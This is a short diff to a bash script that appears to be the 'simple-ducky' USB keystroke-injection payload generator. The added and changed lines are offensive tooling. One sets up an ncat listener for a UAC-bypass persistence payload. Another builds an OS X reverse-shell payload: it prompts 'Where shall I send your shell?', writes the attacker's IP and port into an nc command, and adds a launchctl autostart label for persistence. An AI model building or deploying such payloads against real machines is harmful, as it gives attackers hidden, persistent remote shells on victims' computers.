@@ -96,7 +96,7 @@ f_persistenceVIS7uac(){
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		xterm -e ncat -lvp $attackerport &
 		xdg-open /usr/share/simple-ducky/ &
 		clear	
 		read -p "Would you like to return to the main menu [y/n]? " option
@@ -2824,6 +2824,7 @@ f_osxrev(){
 	echo -e "\e[1;31mTarget:\e[0m MAC OSX (Various)"
 	echo -e "\e[1;31mAuthor:\e[0m Sharkey"	
 	echo ""
+	read -p "Launchctl autostart label? " launchlabel
 	echo ""
 	read -p "Where shall I send your shell? " attackerip
 	echo ""
@@ -2837,6 +2838,7 @@ f_osxrev(){
 	echo ""
 	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
 	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
+	sed -i "s/someName/$launchlabel/g" /usr/share/simple-ducky/payload.txt
 	clear
 	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
 	if [ "$language" == "o" ]; then
